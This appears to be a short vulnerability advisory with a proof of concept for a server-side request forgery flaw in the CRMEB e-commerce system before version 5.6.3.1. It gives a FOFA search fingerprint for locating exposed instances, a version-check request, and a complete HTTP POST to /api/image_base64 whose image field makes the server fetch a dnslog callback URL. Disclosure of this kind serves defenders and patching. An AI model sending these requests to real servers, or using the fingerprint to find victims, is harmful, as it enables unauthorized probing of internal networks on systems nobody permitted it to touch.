# ssrf
A Server-Side Request Forgery (SSRF) vulnerability exists in CRMEB open-source e-commerce system (a free, multilingual online shopping platform built on the ThinkPHP 6 framework) in versions prior to 5.6.3.1. The vulnerability is present in the handling of the user-supplied image parameter within the /api/image_base64 endpoint (or related image-processing interfaces). Insufficient validation of this parameter allows a remote attacker to supply arbitrary URLs, causing the server to initiate unintended outbound requests to internal or external resources. This issue corresponds to CWE-918: Server-Side Request Forgery (SSRF).
fofa：
```
icon_hash=="-847565074"
```
### GER VERSION
```
 GET /api/version
```
#### POC
```
       POST /api/image_base64 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        Content-Type: application/json
        Content-Length: 75

        {"image":"https://dnslog/1.png","code":""}
```
<img width="2130" height="1141" alt="image" src="https://github.com/user-attachments/assets/3ef6c738-dba5-4bf9-9721-376d3ec83876" />
